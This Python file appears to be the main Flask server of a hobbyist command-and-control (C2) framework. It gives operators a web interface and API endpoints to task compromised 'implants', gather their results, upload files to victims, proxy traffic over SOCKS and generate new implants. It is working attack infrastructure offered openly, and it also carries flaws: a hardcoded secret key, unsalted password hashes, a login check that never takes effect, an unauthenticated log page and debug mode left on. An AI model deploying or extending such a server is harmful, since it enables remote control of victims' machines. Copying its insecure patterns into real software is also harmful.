###############################################################################
#                          SKINNY GUERRILLA C2 SERVER                          
#     _____ _    _                      _____                      _ _ _       
#    / ____| |  (_)                    / ____|                    (_) | |      
#   | (___ | | ___ _ __  _ __  _   _  | |  __ _   _  ___ _ __ _ __ _| | | __ _ 
#    \___ \| |/ / | '_ \| '_ \| | | | | | |_ | | | |/ _ \ '__| '__| | | |/ _` |
#    ____) |   <| | | | | | | | |_| | | |__| | |_| |  __/ |  | |  | | | | (_| |
#   |_____/|_|\_\_|_| |_|_| |_|\__, |  \_____|\__,_|\___|_|  |_|  |_|_|_|\__,_|
#                               __/ |                                          
#                              |___/                                           
#
# This is the main file that will initialize the web interface for our server
# which we store in flask. It makes calls to our resources.py backend which 
# in turn makes calls to our sqlite database to update implant tasks and their
# status.
# inspired by: https://github.com/shogunlab/building-c2-implants-in-cpp
# modified by JCSteiner
# USAGE:
# python server.py [certfile] [keyfile]

############################### LOADS DEPENDENCIES ############################
# we want the ability to use Flask, and make API calls
from flask import Flask, render_template, url_for, session, request, redirect
from flask_restful import Api
from turbo_flask import Turbo

# gets important sql query functions
from src.sql_db import query_for_gui, query_for_gui2, query_for_gui3, query_for_gui4, get_logs, is_valid_user, user_exists, add_user

# this is a separate python file that we'll use to manage what happens when we
# access the different uri's offered by our flask app
import src.resources as resources

# the sys module is used for us to parse command line arguments
import sys

# the ssl module is for us to create an ssl context object and run our flask
# app over https
import ssl

import threading

import time

import re

import hashlib

################################ INIT FLASK APP ###############################

# initialize our Flask app
app = Flask(__name__)
app.secret_key = 'big_gorilla_secret_key'

# initialize our API
api = Api(app)
turbo = Turbo(app)

# initializes a dictionary to store our c2 settings from c2_settings.conf
c2_settings = dict()

# opens the conf file, and reads int the c2 settings appicable
infile = open('c2_settings.conf', 'r')
for line in infile:
    # gets rid of the newline character from the line
    line = line.strip()

    # gets the variable, and the associated value from the line
    key, val = line.split(',')

    # stores in the dictionary
    c2_settings[key] = val
    
infile.close()

# defines our index page template
@app.route('/gui')
def gui():

    try:
        if not session['loggedin']:
            redirect(url_for('login'))
    except:
        redirect(url_for('login'))

    # gets implant format and gui
    implant_id_and_format = query_for_gui()

    data = []
    history = []

    # for each implant
    for i in range(0, len(implant_id_and_format)):

        # gets set notes and such
        implant_id, f, notes = implant_id_and_format[i-1]

        # if sa info exists, gets it
        try:
            sa_ip, sa_hostname, sa_username = query_for_gui2(implant_id)

        except:

            sa_ip = ''
            sa_hostname = ''
            sa_username = ''

        try:
            # gets the implant history
            implant_history = [[h[0], h[1], h[2], h[3], h[4], h[5]]   \
                            for h in query_for_gui3(implant_id)]

        except:
            implant_history = [['', '', '', '', '']]

        
        try:
            # gets the sent commands that do not yet have results
            sent_commands = query_for_gui4(implant_id)

            implant_history += sent_commands

        except:

            pass

        # if we have history, appends to it
        if len(implant_history) > 0:

            history.append(implant_history[-30:])

            try:

                # gets the data 
                test_data1 = [implant_id, f, sa_ip, sa_hostname, sa_username, notes]

                data.append(test_data1)

            except:
                pass

    # sets the app's history
    app.history = history
    return render_template('index.html', implants=data, history=history, num_implants = len(data), 
                           task_uri=c2_settings['task_uri'],upload_uri=c2_settings['upload_uri'])


# forces login
@app.route('/')
@app.route('/login', methods=['GET', 'POST'])
def login():

    # if you already logged in, sends you to the index
    try:
        if session['loggedin']:
            return redirect(url_for('gui'))
    except:
        pass
    

    # gets the login data
    msg = ''
    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
        username = request.form['username']
        password_raw = request.form['password']

        # hashes password
        sha = hashlib.sha256()
        sha.update(password_raw.encode())
        password = sha.hexdigest()

        # gets if the password hash is valid
        account = is_valid_user(username, password)

        # if we are logged in, sets session variables
        if account:
            session['loggedin'] = True
            session['id'] = account[0]
            session['username'] = account[1]
            return redirect(url_for('gui'))
        else:
            msg = 'Incorrect username/password!'

    return render_template('login.html', msg=msg)

# if we log out, gets rid of all session info
@app.route('/logout')
def logout():
    session.pop('loggedin', None)
    session.pop('id', None)
    session.pop('username', None)
    return redirect(url_for('login'))

# if we go to /register
@app.route('/register', methods=['GET', 'POST'])
def register():
    msg = ''
    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
        username = request.form['username']
        password_raw = request.form['password']

        # hashes password
        sha = hashlib.sha256()
        sha.update(password_raw.encode())
        password = sha.hexdigest()

        # if user already exists
        account = user_exists(username)

        # performs some minimal validation here
        if account:
            msg = 'Account already exists!'
        elif not re.match(r'[A-Za-z0-9]+', username):
            msg = 'Username must contain only letters and numbers!'
        elif not username or not password:
            msg = 'Please fill out the form!'
        else:
            add_user(username, password)
            msg = 'You have successfully registered!'

            return redirect(url_for('login'))
    return render_template('register.html', msg=msg)


# sends you to the log viewer
@app.route('/logs')
def logs():

    all_logs = get_logs()

    return render_template('logs.html', logs = all_logs)



def update_load():

    with app.app_context():
        while True:
            time.sleep(1)
            try:
                # gets the implant's id and format
                implant_id_and_format = query_for_gui()

                # defaults history and data empty lists
                history = []
                data = []

                # for each implant
                for i in range(0, len(implant_id_and_format)):

                    # gets the data needed from it
                    implant_id, f, notes = implant_id_and_format[i-1]

                    # appends to the history
                    try:

                        # gets the implant history
                        implant_history = [[h[0], h[1], h[2], h[3], h[4], h[5]]   \
                            for h in query_for_gui3(implant_id)]

                    # if we don't get valid history for the implant, then we skip it
                    except:
                        implant_history = [['', '', '', '', '']]

                    # attempts to get pending commands
                    try:

                        # commands that are pending are queried here
                        sent_all = query_for_gui4(implant_id)

                        for sent in sent_all:
                            implant_history += [(sent[0], sent[1], sent[2], sent[3], sent[4], sent[5])]

                    except:
                        pass

                    # if we have valid history
                    if len(implant_history) > 0:

                        # appends last 30 commands sent
                        history.append(implant_history[-30:])

                        # appends to data so we can get the len data next. we need implant id for history still
                        # which is why we redo so much here, I tried to save what little computing power I could
                        # by re-writing it
                        try:

                            test_data1 = [implant_id, f, '', '', '', '']

                            data.append(test_data1)

                        except:
                            pass

                # if the history has changed
                if app.history != history:
                    
                    # update the history
                    app.history = history
                    turbo.push(turbo.replace(render_template('history.html', implants=data, history=history, 
                                num_implants = len(data),task_uri=c2_settings['task_uri'],upload_uri=c2_settings['upload_uri']), 'history'))
            except:
                pass


# defaults to an uninitialized app
app.is_initialized = False

# if we are not initialized
if not app.is_initialized:
    with app.app_context():
        # starts our web socket
        threading.Thread(target=update_load).start()
    
    # we don't want to create any more web sockets
    app.is_initialized = True

# defines the routes for each of our resources. when we get to these endpoints
# the respective class' "get" function is called. when we post to these endpoints,
# the respective class' "post" function is called.

# /tasks/implant_id handles pending tasks for given implants
api.add_resource(resources.Tasks, f'/{c2_settings["task_uri"]}/<implant_id>', endpoint='tasks')
# /results/implant_id handles processing results returned from the implants
api.add_resource(resources.Results, f'/{c2_settings["result_uri"]}/<implant_id>', endpoint='results')
# /history shows all command logs for all implants
api.add_resource(resources.History, '/history', endpoint='history')
# /implant/format handles implant creation 
api.add_resource(resources.Implant, '/implant/<format>', endpoint='implant')
# /upload handles files that are being uploaded to the target via C2
api.add_resource(resources.Upload, f'/{c2_settings["upload_uri"]}/<implant_id>', endpoint='upload')
# /socks/implant_id handles socks proxy setups for each implant
api.add_resource(resources.Socks, '/socks/<implant_id>', endpoint='socks')


##################################### MAIN ####################################
# only runs this section if server.py is being run in the context of a standalone file
if __name__ == '__main__':

    # if we input some type of help switch into the server.py run command
    if len(sys.argv) > 1 and sys.argv[1].lower() in ['-h', '-help', 'help', '--help', 'h']:
        
        # tells us the usage of the server
        print('[+] USAGE: python server.py [certfile_path] [keyfile_path]. To disable https, do not provide cert or keyfiles.')

    # gets the ip and port from the c2_settings conf
    ip, port = c2_settings['ip'].split(':')

    # if we provided enough arguments to enable ssl
    if len(sys.argv) == 3:

        # setup to enable ssl
        certfile_path = sys.argv[1]
        keyfile_path = sys.argv[2]
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain(certfile='cert.pem', keyfile='private.key')
        
        # runs the app with ssl enabled
        app.run(host=ip, port=port, ssl_context=context,debug=True)

    # if we are not running with ssl
    else:
        app.run(host=ip, port=port,debug=True)